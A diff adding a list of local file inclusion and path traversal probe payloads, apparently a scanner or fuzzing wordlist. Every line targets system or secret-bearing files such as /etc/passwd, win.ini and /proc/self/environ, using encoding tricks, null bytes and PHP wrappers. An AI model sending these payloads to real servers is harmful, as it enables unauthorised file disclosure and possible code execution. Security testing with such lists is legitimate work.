@@ -1,0 +1,47 @@
+# LFI / path traversal probe payloads - one per line, # lines are comments.
+# Basic unix traversal
+../../../../etc/passwd
+# Deep unix traversal
+../../../../../../etc/passwd
+# Basic windows traversal
+..\..\..\..\windows\win.ini
+# Deep windows traversal
+..\..\..\..\..\..\windows\win.ini
+# Absolute unix path
+/etc/passwd
+# Absolute windows path
+C:\windows\win.ini
+# URL-encoded traversal
+..%2f..%2f..%2fetc%2fpasswd
+# Double URL-encoded traversal
+..%252f..%252f..%252fetc%252fpasswd
+# Mixed encoding dots
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# Unicode overlong encoding
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+# Backslash unix mix
+..\..\..\etc/passwd
+# Null byte truncation (legacy PHP)
+../../../../etc/passwd%00
+# PHP filter base64 wrapper
+php://filter/convert.base64-encode/resource=index
+# PHP filter on etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+# Expect wrapper probe (RCE check, legacy)
+php://input
+# Data wrapper probe
+data://text/plain,probe
+# Proc self environ (linux)
+../../../../proc/self/environ
+# Proc cmdline (linux)
+../../../../proc/self/cmdline
+# Windows hosts file
+..\..\..\..\windows\system32\drivers\etc\hosts
+# Traversal with query string
+../../../../etc/passwd?
+# Traversal with fragment
+../../../../etc/passwd#
+# Dot-dot-slash with semicolon
+..;/..;/..;/etc/passwd
+# Absolute with forward slashes windows
+C:/windows/win.ini
